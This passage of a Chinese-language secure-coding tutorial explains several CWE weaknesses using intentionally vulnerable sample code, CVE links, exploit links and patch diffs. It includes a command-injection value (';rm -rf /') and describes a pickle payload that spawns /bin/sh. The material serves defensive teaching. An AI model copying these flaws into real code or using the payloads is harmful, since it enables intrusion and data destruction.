href=\"https://github.com/osuosl/twisted_vncauthproxy/commit/edc149af29242178091b2d6fcd42c3ef0851644b\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/osuosl/twisted_vncauthproxy/commit/edc149af29242178091b2d6fcd42c3ef0851644b</a>"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$2b"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 216px, var(--bg-transparent-red) 216px 264px, transparent 264px, transparent 264px, var(--bg-transparent-green) 264px 312px, transparent 312px, transparent 696px, var(--bg-transparent-red) 696px 768px, transparent 768px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$2c"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">\\x02\\x01\\x02</code>分别代表支持的列表长度、列表内容，原先可能因为某些原因支持无认证模式访问，存在漏洞利用风险。"}}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/190.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-190: Integer Overflow or Wraparound"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"整数溢出或整数回绕，当有符号数相加超过正负值上限时可能发生溢出；当无符号数相加超过上限就会从<code class=\"x-inline-highlight\">0</code>开始“回绕”；或者计算<code class=\"x-inline-highlight\">unsigned(0) - 1</code>时，会得到最大值。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"img_t table_ptr; /*struct containing img data, 10kB each*/\nint num_imgs;\n...\nnum_imgs = get_num_imgs();\ntable_ptr = (img_t *)malloc(sizeof(img_t) * num_imgs);\n...\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$2d"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"随着<code class=\"x-inline-highlight\">num_imgs</code>增大，乘积计算结果可能发生回绕，导致最终分配了一个很小的内存空间。"}}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"short int bytesRec = 0;\nchar buf[SOMEBIGNUM];\n\nwhile (bytesRec < MAXGET)\n{\n    bytesRec += getFromInput(buf + bytesRec);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">short</span> <span class=\"token keyword\">int</span> bytesRec <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span>SOMEBIGNUM<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>bytesRec <span class=\"token operator\">&lt;</span> MAXGET<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    bytesRec <span class=\"token operator\">+=</span> <span class=\"token function\">getFromInput</span><span class=\"token punctuation\">(</span>buf <span class=\"token operator\">+</span> bytesRec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">bytesRec</code>定义为<code class=\"x-inline-highlight\">short int</code>类型，当<code class=\"x-inline-highlight\">MAXGET</code>很大时，很可能导致<code class=\"x-inline-highlight\">bytesRec</code>溢出（永远小于<code class=\"x-inline-highlight\">MAXGET</code>），循环不会终止，并不断地覆盖<code class=\"x-inline-highlight\">buf</code>中的内容。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2018-20330\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2018-20330</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://github.com/libjpeg-turbo/libjpeg-turbo/issues/304\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/libjpeg-turbo/libjpeg-turbo/issues/304</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/libjpeg-turbo/libjpeg-turbo/commit/3d9c64e9f8aa1ee954d1d0bb3390fc894bb84da3\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/libjpeg-turbo/libjpeg-turbo/commit/3d9c64e9f8aa1ee954d1d0bb3390fc894bb84da3</a>"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"pitch = PAD((*width) * tjPixelSize[*pixelFormat], align);\nif ((dstBuf = (unsigned char *)malloc(pitch * (*height))) == NULL)\nif ((unsigned long long)pitch * (unsigned long long)(*height) >\n    (unsigned long long)((size_t)-1) ||\n    (dstBuf = (unsigned char *)malloc(pitch * (*height))) == NULL)\n  _throwg(\"tjLoadImage(): Memory allocation failure\");\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 48px, var(--bg-transparent-red) 48px 72px, transparent 72px, transparent 72px, var(--bg-transparent-green) 72px 144px, transparent 144px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$2e"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/502.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-502: Deserialization of Untrusted Data"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"反序列化不受信任的数据，也就是没有检查反序列化后的结果是否是有效的。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"try\n{\n    File file = new File(\"object.obj\");\n    ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));\n    javax.swing.JButton button = (javax.swing.JButton)in.readObject();\n    in.close();\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$2f"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"如果攻击者替换了文件内容，可能导致风险。<code class=\"x-inline-highlight\">readObject()</code>应当做如下改进："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"private final void readObject(ObjectInputStream in) throws java.io.IOException\n{\n    throw new java.io.IOException(\"Cannot be deserialized\");\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$30"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"class ExampleProtocol(protocol.Protocol):\n    def dataReceived(self, data):\n        # Code that would be here would parse the incoming data\n        # After receiving headers, call confirmAuth() to authenticate\n        pass\n\n    def confirmAuth(self, headers):\n        try:\n            token = cPickle.loads(base64.b64decode(headers['AuthToken']))\n            if not check_hmac(token['signature'], token['data'], getSecretKey()):\n                raise AuthFail\n            self.secure_data = token['data']\n        except:\n            raise AuthFail\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$31"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这段代码没有验证传入数据是否合法。攻击者可以构造一个非法的序列化对象<code class=\"x-inline-highlight\">AuthToken</code>，该对象通过实例化Python的子进程之一来执行任意命令。例如，攻击者可以构建一个利用Python子进程模块的<code class=\"x-inline-highlight\">pickle</code>，该模块会生成新进程并包含许多用于各种用途的参数。由于<code class=\"x-inline-highlight\">Pickle</code>库允许对象定义如何<code class=\"x-inline-highlight\">unpickle</code>，因此攻击者可以指示<code class=\"x-inline-highlight\">unpickle</code>进程在子进程模块中调用<code class=\"x-inline-highlight\">Popen</code>并执行<code class=\"x-inline-highlight\">/bin/sh</code>。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2020-13091\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2020-13091</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"如果<code class=\"x-inline-highlight\">__reduce__</code>调用了<code class=\"x-inline-highlight\">os.system</code>，1.0.3版本的Python Pandas库可以从传递给<code class=\"x-inline-highlight\">read_pickle()</code>函数的不信任文件中反序列化，并执行命令。注意<code class=\"x-inline-highlight\">read_pickle()</code>在<a href=\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.read_pickle.html\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">文档</a>中已经被标记为不安全的，用户有责任确保传入的文件是可信的。"}}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/77.html","target":"_blank","rel":"noreferrer","children":"【C】CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"命令注入，用户输入没有被中和，或错误地中和处理，导致执行的预期命令被修改。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"命令注入漏洞通常发生在以下情况："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"数据从不受信任的来源进入应用程序。"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"数据是字符串的一部分，由应用程序作为命令执行。"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"通过执行命令，应用程序为攻击者提供了其原本无法拥有的权限或能力。"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"int main(int argc, char **argv)\n{\n    char cmd[CMD_MAX] = \"/usr/bin/cat \";\n    strcat(cmd, argv[1]);\n    system(cmd);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$32"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"上述程序出于对运维人员的教学目的将会以管理员权限执行。此时有命令注入的风险，例如传入<code class=\"x-inline-highlight\">\";rm -rf /\"</code>。"}}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"String btype = request.getParameter(\"backuptype\");\nString cmd = new String(\"cmd.exe /K \\\" c:\\\\util\\\\rmanDB.bat \"\n    +btype+\n    \"&&c:\\\\utl\\\\cleanup.bat\\\"\"\n)\n\nSystem.Runtime.getRuntime().exec(cmd);\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$33"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"原因是类似的，<code class=\"x-inline-highlight\">btype</code>参数有被注入的风险。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2024-32027\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2024-32027</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/bmaltais/kohya_ss/commit/831af8babeb75faff62bcc6a8c6a4f80354f1ff1\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/bmaltais/kohya_ss/commit/831af8babeb75faff62bcc6a8c6a4f80354f1ff1</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"此补丁移除了很多Python脚本中的<code class=\"x-inline-highlight\">shell=True</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"subprocess.run(run_cmd, shell=True, env=env)\nsubprocess.run(run_cmd, env=env)\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"subprocess<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>run_cmd<span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> env<span class=\"token operator\">=</span>env<span class=\"token punctuation\">)</span>\nsubprocess<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>run_cmd<span class=\"token punctuation\">,</span> env<span class=\"token operator\">=</span>env<span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"不加<code class=\"x-inline-highlight\">shell=True</code>时，命令作为列表直接传递给操作系统，例如：<code class=\"x-inline-highlight\">subprocess.run(['ls', '-l'])</code>； 这是更安全的。<br/>使用<code class=\"x-inline-highlight\">shell=True</code>时，命令通过解释器（例如<code class=\"x-inline-highlight\">/bin/sh</code>或<code class=\"x-inline-highlight\">cmd.exe</code>）运行，例如：<code class=\"x-inline-highlight\">subprocess.run('ls -l', shell=True)</code>；这可能导致命令注入。"}}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/119.html","target":"_blank","rel":"noreferrer","children":"【C】CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"缓冲区范围内的操作限制不当，产品对内存缓冲区执行操作，但它可以从缓冲区预期边界之外的内存位置读取或写入。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"包括前面提到的越界读取和越界写入。范围较为广泛，这里不详细展开了。"}}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/798.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-798: Use of Hard-coded Credentials"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"使用硬编码的凭证，即凭证在源代码中直接出现。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"下面的代码硬编码了用户名和密码去连接数据库："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"...\nDriverManager.getConnection(url, \"scott\", \"tiger\");\n...\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token class-name\">DriverManager</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConnection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">\"scott\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"tiger\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"有权限访问到此源码的员工可以利用这点闯入系统。更坏的情况是如果攻击者能够访问到程序的字节码，可以使用<code class=\"x-inline-highlight\">javap -c</code>命令反汇编，得到明文密码，例如："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"javap -c ConnMngr.class\n22: ldc #36; //String jdbc:mysql://ixne.com/rxsql\n24: ldc #38; //String scott\n26: ldc #17; //String tiger\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"javap -c ConnMngr.class\n22: ldc #36; //String jdbc:mysql://ixne.com/rxsql\n24: ldc #38; //String scott\n26: ldc #17; //String tiger\n"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"硬编码加密后的密码同样是有问题的。理由同上，只要在源程序中明文出现，都会有很大的风险。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"int VerifyAdmin(char *password)\n{\n    if (strcmp(password, \"68af404b513073584c4b6f22b6c63e6b\"))\n    {\n        printf(\"Incorrect Password!\\n\");\n        return (0);\n    }\n    printf(\"Entering Diagnostic Mode...\\n\");\n    return (1);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$34"}}]}]]}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2020-35296\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2020-35296</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://github.com/Shrimant12/CVE-References/blob/main/CVE-2020-35296.md\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/Shrimant12/CVE-References/blob/main/CVE-2020-35296.md</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"管理员面板有默认账户<code class=\"x-inline-highlight\">admin:admin</code>。"}}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/918.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-918: Server-Side Request Forgery (SSRF)"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"服务端请求伪造，攻击者通过伪造服务器发起的请求，使服务器端的应用程序访问受信任的第三方服务器或资源。通常，攻击者利用此漏洞访问内部系统。SSRF可以看作一种跳板攻击。"}}],["$","$Ld",null,{"src":"ssrf.jpg","width":"800px","filterDarkTheme":true}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2024-3149\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2024-3149</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://huntr.com/bounties/b230d76b-ae2d-440e-a25b-94ffaa7c4ff1\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://huntr.com/bounties/b230d76b-ae2d-440e-a25b-94ffaa7c4ff1</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/mintplex-labs/anything-llm/commit/f4088d9348fa86dcebe9f97a18d39c0a6e92f15e\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/mintplex-labs/anything-llm/commit/f4088d9348fa86dcebe9f97a18d39c0a6e92f15e</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"AnythingLLM的上传链接功能存在SSRF漏洞，该功能面向具有<code class=\"x-inline-highlight\">manager</code>或<code class=\"x-inline-highlight\">admin</code>角色的用户，使用无头浏览器通过内部<code class=\"x-inline-highlight\">collectorApi</code>处理上传的链接。 攻击者可以通过托管恶意网站并使用该网站执行内部端口扫描、访问未对外公开的内部网络应用程序等操作来利用这一漏洞。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"部署AnytingLLM后会有两个<code class=\"x-inline-highlight\">express.js</code>节点运行，分别是<code class=\"x-inline-highlight\">collector</code>和<code class=\"x-inline-highlight\">server</code>。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"补丁引入了<code class=\"x-inline-highlight\">comKey</code>检验数据完整性，让攻击者无法构造出合法的请求头部。部分新增的内容如下：<br/><code class=\"x-inline-highlight\">collector/utils/comKey/index.js</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$35"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$36"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">server/utils/comKey/index.js</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$37"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 216px, var(--bg-transparent-golden) 216px 432px, transparent 432px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$38"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/306.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-306: Missing Authentication for Critical Function"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"重要功能没有做权限认证。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"private boolean isUserAuthentic = false;\n\npublic boolean authenticateUser(String username, String password)\n{\n    // authenticate user,\n    // if user is authenticated then set variable to true\n    // otherwise set variable to false\n    ...\n}\n\npublic BankAccount createNewBankAccount(String accountNumber, String accountType, String accountName, String accountSSN, double balance)\n{\n    BankAccount account = null;\n\n    if (isUserAuthentic)\n    {\n        account = new BankAccount();\n        account.setAccountNumber(accountNumber);\n        account.setAccountType(accountType);\n        account.setAccountOwnerName(accountName);\n        account.setAccountOwnerSSN(accountSSN);\n        account.setBalance(balance);\n    }\n    return account;\n}\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 24px, var(--bg-transparent-golden) 24px 48px, transparent 48px, transparent 72px, var(--bg-transparent-golden) 72px 240px, transparent 240px, transparent 360px, var(--bg-transparent-golden) 360px 384px, transparent 384px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$39"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"上面代码中高亮的部分是<span class=\"x-inline-strong\">正确</span>的做法。如果忽视了验证，就存在风险了。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2020-25966\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2020-25966</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://gitlab.com/Gazzaz/Spectra_API_Issue/\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://gitlab.com/Gazzaz/Spectra_API_Issue/</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Sectona Spectra 3.2.0存在一个易受攻击的SOAP API端点，该端点会在未进行适当身份验证的情况下泄漏敏感信息。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"注：这个CVE是由于系统配置错误导致的。"}}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/362.html","target":"_blank","rel":"noreferrer","children":"【C】CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race 